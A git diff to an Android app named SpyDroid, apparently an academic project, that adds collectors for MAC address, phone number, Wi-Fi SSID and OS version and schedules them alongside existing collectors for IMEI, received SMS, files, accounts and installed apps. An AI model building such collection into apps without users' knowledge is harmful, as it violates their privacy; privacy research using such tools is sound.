@@ -18,10 +18,14 @@ import android.view.View;
 import android.widget.Button;
 import edu.duke.spydroid.CollectorService.CollectorBinder;
 import edu.duke.spydroid.collectors.AccountInfoCollector;
+import edu.duke.spydroid.collectors.AndroidVersionCollector;
 import edu.duke.spydroid.collectors.FileSystemCollector;
 import edu.duke.spydroid.collectors.IMEICollector;
 import edu.duke.spydroid.collectors.InstalledAppCollector;
+import edu.duke.spydroid.collectors.MACCollector;
+import edu.duke.spydroid.collectors.PhoneNumberCollector;
 import edu.duke.spydroid.collectors.SMSCollector;
+import edu.duke.spydroid.collectors.SSIDCollector;
 import edu.duke.spydroid.view.DataCollectionPaneController;
 import edu.duke.spydroid.view.PreferenceController;
 
@@ -134,10 +138,17 @@ public final class SpyDroid extends Activity {
 		BroadcastCollector smsColl= new SMSCollector(collService,"coll_received_SMS",smsFilter);
 		StaticCollector fileColl= new FileSystemCollector(getApplicationContext(),"coll_file_system",collService);
 	    StaticCollector accountColl= new AccountInfoCollector(getApplicationContext(),"coll_account_info",null);
-	        
-		
+	    StaticCollector MACColl= new MACCollector(getApplicationContext(),"coll_MAC",null);    
+	    StaticCollector PNColl= new PhoneNumberCollector(getApplicationContext(),"coll_phone_number",null);
+	    StaticCollector SSIDColl= new SSIDCollector(getApplicationContext(),"coll_SSID",null);
+	    StaticCollector versionColl= new AndroidVersionCollector(getApplicationContext(),"coll_version",null);
+	    
 		//Scheduling
 		collService.scheduleCollector(imeiColl);
+		collService.scheduleCollector(MACColl);
+		collService.scheduleCollector(PNColl);
+		collService.scheduleCollector(SSIDColl);
+		collService.scheduleCollector(versionColl);
 		collService.scheduleCollector(appColl);
 		collService.scheduleCollector(smsColl);
 		collService.scheduleCollector(fileColl);
